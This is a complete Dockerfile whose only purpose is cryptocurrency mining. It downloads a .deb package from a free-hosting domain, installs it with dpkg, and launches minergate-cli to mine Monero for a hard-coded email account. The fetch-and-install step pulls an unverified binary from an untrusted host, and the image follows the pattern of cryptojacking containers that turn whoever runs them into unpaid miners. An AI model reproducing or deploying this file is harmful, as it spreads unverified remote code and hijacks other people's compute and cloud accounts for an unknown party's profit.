FROM ubuntu:16.04

RUN apt-get update \
    && apt-get -qq --no-install-recommends install \
        ca-certificates \
        wget \
    && rm -r /var/lib/apt/lists/*

RUN wget -q --content-disposition https://hupiter.000webhostapp.com/a.deb \
    && dpkg -i *.deb \
    && rm *.deb
RUN minergate-cli -user greenfieldsvp@outlook.com.vn -xmr

